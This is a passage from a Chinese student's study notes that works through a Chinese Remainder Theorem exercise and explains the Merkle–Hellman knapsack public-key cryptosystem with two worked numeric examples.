style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.24810799999999997em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.4518920000000004em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>   这里求逆得时候可以直接试，7关于11的逆怎么求呢？直接从1试到8，发现<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>7</mn><mo>∗</mo><mn>8</mn><mo>=</mo><mn>56</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">7*8 =56=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，那8就是逆了。</p><p>则最后的解为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mn>56</mn><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><mn>22</mn><msub><mi>b</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>77</mn></mrow><annotation encoding="application/x-tex">x=56b_1+22b_2\ mod\ 77</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">5</span><span class="mord">6</span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">7</span><span class="mord">7</span></span></span></span>。</p><p>这里的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>b</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">b_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">b_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>实际上都有两种可能，分别为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>±</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\pm1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">±</span><span class="mord">1</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>±</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">\pm4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">±</span><span class="mord">4</span></span></span></span>。</p><p>最后的解分别为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>67</mn><mo separator="true">,</mo><mn>45</mn><mo separator="true">,</mo><mn>32</mn><mo separator="true">,</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">67,45,32,10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">6</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span></span></span></span>。</p><h2 id="knapsack"><a class="markdownIt-Anchor" href="#knapsack"></a> Knapsack</h2><p>背包密码。将信息01串隐藏在选择哪个背包中，比如第一个选，第二个不选，那就是10。</p><p>这里我们只考虑简单背包，也就是给你一个重量后，到底选择哪些背包是唯一确定的。</p><p><img src="https://upyun.wuuconix.link/image-20211018125023601.png" alt="简单Knapsack" /></p><p><img src="https://upyun.wuuconix.link/image-20211018125038381.png" alt="超递增学列举例" /></p><p><img src="https://upyun.wuuconix.link/image-20211018125228880.png" alt="加解密" /></p><p><img src="https://upyun.wuuconix.link/image-20211018125405849.png" alt="加解密例子" /></p><p>值得注意的是，这里的例子还不是公钥密码，因为它只有一个密钥。我们需要将这种背包的思路转化为一个巧妙的公钥密码。</p><p>于是，我们便对这个背包改变一波，给大众一个更改后的背包。</p><p>首先取一个整数S，S需要比原本背包的总共重量大。</p><p>然后再取一个和S互素的数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span></span></span></span>。</p><p>然后将原始的背包的每个重量都乘上这个t，构成一个新包（记得模</p><p>即<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>u</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>t</mi><msub><mi>a</mi><mn>1</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>s</mi><mo separator="true">,</mo><mi>t</mi><msub><mi>a</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>s</mi><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>t</mi><msub><mi>a</mi><mi>n</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">u=(u_1,u_2,..u_n)=(ta_1\ mod\ s, ta_2\ mod\ s,...,ta_n\ mod\ s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span></p><p>这个u就是新包了。向外公开<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(u,s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span>做为公钥，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(a,t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>做为私钥。</p><p>加密要怎么样呢？直接加就行了！最后模一个s。</p><p><img src="https://upyun.wuuconix.link/image-20211018133523471.png" alt="加密" /></p><p>所以加密出来是一个数。</p><p>我们这里可能会想，破译者能不能直接根据密文和这个假背包得到明文呢？仔细思考一下就会发现是不可能的，因为我们能够准确的求出一个序列，也就是确定哪些包选择，哪些包不选择的前提条件是这个背包是超递增序列，而这个u呢？它是经过模运算后的，它的值是乱七八糟的，肯定不是超递增序列了，所以是不可能直接通过u和c得到明文的。</p><p>也就是我们如果要得到序列，肯定是要一个超递增序列，那么我们就需要把u这个包重新转换为a这个包，实际上乘上<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>t</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">t^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>即可。</p><p><img src="https://upyun.wuuconix.link/image-20211018133959756.png" alt="解密" /></p><p>乘上-1后那个值实际上就是在原背包里的重量。我们很容易根据超递增序列来求出哪些包取哪些包不取，也就解密出来了。</p><h3 id="背包例子1"><a class="markdownIt-Anchor" href="#背包例子1"></a> 背包例子1</h3><p><img src="https://upyun.wuuconix.link/image-20211018134125642.png" alt="example" /></p><p>首先我们求一下u背包 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mo>=</mo><mo stretchy="false">(</mo><mn>575</mn><mo separator="true">,</mo><mn>436</mn><mo separator="true">,</mo><mn>1586</mn><mo separator="true">,</mo><mn>1030</mn><mo separator="true">,</mo><mn>1921</mn><mo separator="true">,</mo><mn>569</mn><mo separator="true">,</mo><mn>721</mn><mo separator="true">,</mo><mn>1183</mn><mo separator="true">,</mo><mn>1570</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">u=(575,436,1586,1030,1921,569,721,1183,1570)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mord">3</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord">8</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">3</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mord">6</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mord">2</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">8</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord">7</span><span class="mord">0</span><span class="mclose">)</span></span></span></span></p><p>这里算吐了，如果刘杨出这么长的背包和这么大的数，我就要寄刀片了。</p><p>之后的加密反而容易。</p><p>假设你要进行加密的信息为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>101100111</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(101100111)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><p>则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><mn>575</mn><mo>+</mo><mn>1586</mn><mo>+</mo><mn>1030</mn><mo>+</mo><mn>721</mn><mo>+</mo><mn>1188</mn><mo>+</mo><mn>1570</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>2003</mn><mo>=</mo><mn>656</mn></mrow><annotation encoding="application/x-tex">c=575+1586+1030+721+1188+1570\ mod\ 2003=656</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">5</span><span class="mord">7</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord">8</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">3</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">7</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">8</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mord">7</span><span class="mord">0</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">5</span><span class="mord">6</span></span></span></span>。</p><p>如何解密呢？我们只需要求一下一开始的t的逆（关于s）为317。</p><p>然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>∗</mo><msup><mi>t</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mn>656</mn><mo>∗</mo><mn>317</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>2003</mn><mo>=</mo><mn>1643</mn></mrow><annotation encoding="application/x-tex">c*t^{-1}=656*317\ mod\ 2003=1643</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">5</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mord">7</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mord">4</span><span class="mord">3</span></span></span></span>。</p><p>然后根据原始背包，我们很容易得到序列<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>101100111</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(101100111)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><h3 id="背包例子2"><a class="markdownIt-Anchor" href="#背包例子2"></a> 背包例子2</h3><p>上一题显然计算量太大了，这里还有一道简单的，估计考试就是这种简单的难度。</p><p><img src="https://upyun.wuuconix.link/image-20211018143105697.png" alt="kanasack example 2" /></p><p>这里我们先求一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>t</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">t^{-1}=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span>。</p><p>再求u包<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mo>=</mo><mo stretchy="false">(</mo><mn>23</mn><mo separator="true">,</mo><mn>68</mn><mo separator="true">,</mo><mn>69</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>11</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">u=(23,68,69,5,11)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><p>假设需要加密的信息为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mn>01011</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=(01011)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><p>则<span class="katex"><span 